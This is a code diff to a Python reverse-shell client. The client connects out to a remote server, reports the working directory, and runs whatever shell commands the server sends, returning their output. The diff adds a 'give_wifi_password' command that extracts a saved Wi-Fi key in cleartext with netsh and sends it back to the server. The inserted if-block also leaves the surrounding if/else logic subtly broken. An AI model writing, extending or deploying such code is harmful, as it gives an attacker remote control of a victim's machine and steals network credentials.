@@ -9,15 +9,22 @@ BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
 # separator string for sending 2 messages in one go
 SEPARATOR = "<sep>"
 
+#CREATION OF SOCKET
 # create the socket object
 s = socket.socket()
+
+#BINDING OF SOCKET
 # connect to the server
 s.connect((SERVER_HOST, SERVER_PORT))
 
+
+#FIRST INTERACTION WITH SERVER
 # get the current directory
 cwd = os.getcwd()
 s.send(cwd.encode())
 
+
+#INTERACTION WITH SERVER
 while True:
     # receive the command from the server
     command = s.recv(BUFFER_SIZE).decode()
@@ -35,6 +42,8 @@ while True:
         else:
             # if operation is successful, empty message
             output = ""
+    if command.lower() == "give_wifi_password":
+        output = subprocess.getoutput('netsh wlan show profile name="WIFI_NAME" key=clear | findstr "Key Content"')
     else:
         # execute the command and retrieve the results
         output = subprocess.getoutput(command)
